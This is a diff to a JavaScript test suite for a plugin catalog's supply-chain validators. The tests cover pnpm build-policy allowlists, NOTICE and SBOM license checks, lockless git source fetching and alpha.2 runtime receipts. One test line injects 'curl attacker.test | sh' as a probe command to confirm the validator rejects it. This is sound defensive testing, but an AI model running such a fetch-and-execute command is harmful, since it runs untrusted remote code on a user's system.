@@ -150,6 +150,25 @@ function itemBase({ id, slug, name, version, distribution, scripts = {}, redistr
   };
 }
 
+function resolvedLifecyclePolicy(items) {
+  const directKeys = items.map((item) => ({
+    catalogId: item.catalogId,
+    packageName: item.package.name,
+    policyKey: `${item.package.name}@file:../../prepared/${item.catalogId}.tgz`,
+    snapshotKey: `${item.package.name}@file:../../prepared/${item.catalogId}.tgz`,
+  })).sort((left, right) => left.catalogId - right.catalogId);
+  const authorizedKeys = directKeys
+    .filter((entry) => items.find((item) => item.catalogId === entry.catalogId)
+      .package.lifecycleAuthorization.required)
+    .map((entry) => entry.policyKey)
+    .sort();
+  const deniedKeys = directKeys
+    .filter((entry) => !authorizedKeys.includes(entry.policyKey))
+    .map((entry) => entry.policyKey)
+    .sort();
+  return { schemaVersion: 2, directKeys, authorizedKeys, deniedKeys };
+}
+
 function packageArchive({ name, version, scripts = {} }) {
   const manifest = Buffer.from(`${JSON.stringify({
     name,
@@ -174,6 +193,7 @@ function hostedFixture() {
   const manifestDocument = {
     name,
     version,
+    license: 'MIT',
     dsh: { bundle: { patch: 'cordis.patch.yml' } },
   };
   const manifest = Buffer.from(`${JSON.stringify(manifestDocument)}\n`);
@@ -185,6 +205,7 @@ function hostedFixture() {
     version,
     purl,
     'bom-ref': purl,
+    licenses: [{ expression: 'MIT' }],
     properties: [{
       name: 'dsh-themes:package-manifest-sha256',
       value: manifestSha256,
@@ -199,11 +220,15 @@ function hostedFixture() {
     dependencies: [{ ref: purl, dependsOn: [] }],
   };
   const license = Buffer.from('MIT License\n');
+  const notice = Buffer.from(
+    `# Modification notice\n\nHosted adaptation of ${name}@${version}.\n\n- License: MIT\n`
+  );
   const sbom = Buffer.from(`${JSON.stringify(sbomDocument)}\n`);
   const artifact = tar([
     { name: 'package/package.json', body: manifest },
     { name: 'package/cordis.patch.yml', body: '[]\n' },
     { name: 'package/LICENSE', body: license },
+    { name: 'package/NOTICE.md', body: notice },
     { name: 'package/SBOM.cdx.json', body: sbom },
   ]);
   const artifactSha256 = sha256(artifact);
@@ -223,6 +248,7 @@ function hostedFixture() {
       artifactIntegrity: integrity(artifactSha256),
       manifestSha256,
       licenseFile: { path: 'LICENSE', sha256: sha256(license) },
+      noticeFile: { path: 'NOTICE.md', sha256: sha256(notice) },
       sbom: { format: 'cyclonedx-json', path: 'SBOM.cdx.json', sha256: sha256(sbom) },
     },
   });
@@ -255,6 +281,25 @@ test('hosted authority binds the v0.8.0 Release coordinate, manifest-rooted SBOM
   const commandDsl = structuredClone(fixture.item);
   commandDsl.runtimeAcceptance.functionalProbe.command = 'curl attacker.test | sh';
   assert.throws(() => validateItem(commandDsl), /keys must be exactly/u);
+
+  const missingNotice = structuredClone(fixture.item);
+  delete missingNotice.distribution.noticeFile;
+  assert.throws(() => validateItem(missingNotice), /keys must be exactly/u);
+
+  const misleadingNoticePath = structuredClone(fixture.item);
+  misleadingNoticePath.distribution.noticeFile.path = 'README.md';
+  assert.throws(() => validateItem(misleadingNoticePath), /must use NOTICE\.md/u);
+
+  const wrongSbomLicense = structuredClone(fixture.sbomDocument);
+  wrongSbomLicense.metadata.component.licenses[0].expression = 'Apache-2.0';
+  assert.throws(
+    () => validateCycloneDxSbom(
+      wrongSbomLicense,
+      fixture.item,
+      fixture.manifestDocument
+    ),
+    /license expression/u
+  );
 
   const selfReference = structuredClone(fixture.sbomDocument);
   selfReference.metadata.component.properties[0].value = fixture.item.distribution.artifactSha256;
@@ -293,6 +338,7 @@ test('workspace lifecycle policy rejects global build bypasses and verifies effe
   const base = 'packages:\n  - .\n';
   const normalized = authorizePrepareText(base, []);
   assert.equal(normalized.changed, true);
+  assert.deepEqual(normalized.deniedKeys, []);
   assert.match(normalized.source, /dangerouslyAllowAllBuilds: false/u);
   assert.match(normalized.source, /strictDepBuilds: true/u);
   assert.throws(
@@ -329,6 +375,10 @@ test('workspace lifecycle policy rejects global build bypasses and verifies effe
     () => validateEffectivePnpmBuildPolicy({ ...safe, allowBuilds: {} }, ['@example/plugin'], true),
     /does not match/u
   );
+  assert.throws(
+    () => validateEffectivePnpmBuildPolicy(safe, ['@example/plugin'], false),
+    /does not match/u
+  );
 
   assert.throws(
     () => verifyEffectivePnpmBuildPolicy(
@@ -336,7 +386,7 @@ test('workspace lifecycle policy rejects global build bypasses and verifies effe
       ['@example/plugin'],
       true
     ),
-    /only one controlled environment/u
+    /controlled environment/u
   );
 });
 
@@ -383,20 +433,21 @@ test('workspace lifecycle revocation removes only selected true entries and pres
     'dangerouslyAllowAllBuilds: false',
     'strictDepBuilds: true',
     'allowBuilds:',
-    `  ${first.package.name}: true`,
+    `  ${JSON.stringify(`${first.package.name}@file:../../prepared/${first.catalogId}.tgz`)}: true`,
     '  unrelated-package: true',
     '  denied-package: false',
     '',
   ].join('\n');
-  const revoked = revokePrepareText(source, [first]);
-  assert.doesNotMatch(revoked.source, new RegExp(`^  ${first.package.name}:`, 'mu'));
+  const firstPolicy = resolvedLifecyclePolicy([first]);
+  const revoked = revokePrepareText(source, [first], firstPolicy);
+  assert.doesNotMatch(revoked.source, /dsh-revoke-one@file:/u);
   assert.match(revoked.source, /unrelated-package: true/u);
   assert.match(revoked.source, /denied-package: false/u);
   assert.doesNotThrow(() => validateEffectivePnpmBuildPolicy({
     allowBuilds: { 'unrelated-package': true, 'denied-package': false },
     dangerouslyAllowAllBuilds: false,
     strictDepBuilds: true,
-  }, [first.package.name], false));
+  }, firstPolicy.authorizedKeys, false));
 });
 
 test('bounded fetch uses manual allowlisted redirects, exact bytes, and streaming limits', async () => {
@@ -607,6 +658,82 @@ test('authority-bound source fetch verifies exact npm, GitHub Release, and full 
   const savedReceipt = JSON.parse(await readFile(join(root, 'git', 'fetch-receipt.json'), 'utf8'));
   assert.equal(JSON.stringify(savedReceipt).includes('github.com'), false);
   assert.equal(savedReceipt.candidateExecuted, false);
+
+  const locklessCommit = 'e'.repeat(40);
+  const locklessTree = 'f'.repeat(40);
+  const locklessManifest = Buffer.from(`${JSON.stringify({
+    name: 'lockless-plugin',
+    version: '1.0.1',
+    files: ['lib', 'cordis.patch.yml'],
+    dsh: { bundle: { patch: 'cordis.patch.yml' } },
+  })}\n`);
+  const locklessItem = itemBase({
+    id: 3005,
+    slug: 'lockless-fixture',
+    name: 'lockless-plugin',
+    version: '1.0.1',
+    distribution: {
+      kind: 'upstream-plugin-verified',
+      source: {
+        type: 'git-commit',
+        repository: 'https://github.com/example/lockless-plugin.git',
+        commit: locklessCommit,
+        tree: locklessTree,
+        subdir: '.',
+        installSpec:
+          `git+https://github.com/example/lockless-plugin.git#${locklessCommit}`,
+        manifestSha256: sha256(locklessManifest),
+        lockfilePath: null,
+        lockfileSha256: null,
+      },
+    },
+  });
+  responses.set(
+    `https://api.github.com/repos/example/lockless-plugin/git/commits/${locklessCommit}`,
+    Buffer.from(JSON.stringify({ sha: locklessCommit, tree: { sha: locklessTree } }))
+  );
+  responses.set(
+    `https://raw.githubusercontent.com/example/lockless-plugin/${locklessCommit}/package.json`,
+    locklessManifest
+  );
+  const locklessResult = await fetchAuthorityBoundSource({
+    item: locklessItem,
+    output: join(root, 'lockless'),
+    fetchImpl,
+  });
+  assert.equal(locklessResult.receipt.evidence.lockfileSha256, null);
+  await assert.rejects(readFile(join(root, 'lockless', 'pnpm-lock.yaml')), /ENOENT/u);
+
+  const unsafeCommit = '1'.repeat(40);
+  const unsafeTree = '2'.repeat(40);
+  const unsafeManifest = Buffer.from(`${JSON.stringify({
+    name: 'lockless-plugin',
+    version: '1.0.1',
+    dependencies: { runtime: '1.0.0' },
+    dsh: { bundle: { patch: 'cordis.patch.yml' } },
+  })}\n`);
+  const unsafeLockless = structuredClone(locklessItem);
+  unsafeLockless.distribution.source.commit = unsafeCommit;
+  unsafeLockless.distribution.source.tree = unsafeTree;
+  unsafeLockless.distribution.source.installSpec =
+    `git+https://github.com/example/lockless-plugin.git#${unsafeCommit}`;
+  unsafeLockless.distribution.source.manifestSha256 = sha256(unsafeManifest);
+  responses.set(
+    `https://api.github.com/repos/example/lockless-plugin/git/commits/${unsafeCommit}`,
+    Buffer.from(JSON.stringify({ sha: unsafeCommit, tree: { sha: unsafeTree } }))
+  );
+  responses.set(
+    `https://raw.githubusercontent.com/example/lockless-plugin/${unsafeCommit}/package.json`,
+    unsafeManifest
+  );
+  await assert.rejects(
+    fetchAuthorityBoundSource({
+      item: unsafeLockless,
+      output: join(root, 'unsafe-lockless'),
+      fetchImpl,
+    }),
+    /lockless Git source must be prebuilt/u
+  );
 });
 
 test('future frozen Top10 requires six scores, exact totals, ranking, eight-use-case union, and coexistence receipts', async () => {
@@ -619,7 +746,7 @@ test('future frozen Top10 requires six scores, exact totals, ranking, eight-use-
   const entries = items.slice(0, 10).map((item, index) => {
     const scores = {
       userValueAndUseCaseClarity: 25 - index,
-      stabilityMaintenanceAndAlpha1Fit: 25,
+      stabilityMaintenanceAndAlpha2Fit: 25,
       securityAndPermissionRestraint: 15,
       crossPlatformInstallRemoveRollback: 15,
       nonTechnicalUsabilityAndDocs: 10,
@@ -696,13 +823,13 @@ test('future frozen Top10 requires six scores, exact totals, ranking, eight-use-
   assert.throws(() => validateTop10ReleaseSet(noCoexistence, { authority }), /complete 80\/80/u);
 });
 
-test('Harness runtime set accepts only the canonical six-task shared-run matrix while current publication remains 0/6', async () => {
+test('Harness alpha.2 runtime set accepts only the canonical dual-artifact six-task matrix while publication remains 0/6', async () => {
   const authority = await loadHarnessAuthority();
   assert.equal(authority.publication.completedReceipts.length, 0);
   assert.equal(authority.publication.receiptSetSha256, null);
   const workflow = {
     repository: 'LvvUP/dsh-themes-skills',
-    workflowPath: '.github/workflows/alpha1-runtime-certification.yml',
+    workflowPath: '.github/workflows/alpha2-runtime-certification.yml',
     workflowSha256: '5'.repeat(64),
     runId: '123456789',
     runAttempt: 1,
@@ -724,16 +851,33 @@ test('Harness runtime set accepts only the canonical six-task shared-run matrix 
   const entries = tasks.map((task, index) => {
     const receipt = {
       schemaVersion: 1,
-      status: 'alpha1-runtime-task-passed',
+      status: 'alpha2-runtime-task-passed',
       scope: 'one-platform-node-task',
       source,
       task,
-      build: {
-        buildReceiptSha256: sha256(Buffer.from(`build-receipt-${index}`)),
-        builtCliSha256: sha256(Buffer.from(`built-cli-${index}`)),
+      artifacts: {
+        officialNpm: {
+          installReceiptSha256: sha256(Buffer.from(`install-receipt-${index}`)),
+          installedCliSha256: authority.officialNpm.cliSha256,
+          tarballSha256: authority.officialNpm.tarballSha256,
+          resolutionLockfileSha256: authority.runtimeInstall.lockfileSha256,
+        },
+        sourceCrossBuild: {
+          buildReceiptSha256: sha256(Buffer.from(`build-receipt-${index}`)),
+          builtCliSha256: sha256(Buffer.from(`built-cli-${index}`)),
+          reportedVersion: authority.release.version,
+        },
+      },
+      provenanceBoundary: {
+        officialNpmOperationalRuntime: true,
+        exactSourceCrossBuild: true,
+        npmGitHeadPresent: false,
+        npmProvenanceAttestationPresent: false,
+        binarySourceEquivalenceClaimed: false,
+        artifactRelationship: 'independent-artifacts-no-source-package-binding',
       },
       probes: {
-        cli: { reportedVersion: '0.1.2-alpha.1' },
+        cli: { reportedVersion: '0.1.2-alpha.2' },
         profile: { name: 'web', dumpConfigPassed: true },
         browserAuth: {
           unauthenticatedRootStatus: 401,
@@ -771,7 +915,7 @@ test('Harness runtime set accepts only the canonical six-task shared-run matrix 
   });
   const receiptSet = {
     schemaVersion: 1,
-    status: 'alpha1-runtime-matrix-verified',
+    status: 'alpha2-runtime-matrix-verified',
     source,
     workflow,
     requiredReceiptCount: 6,
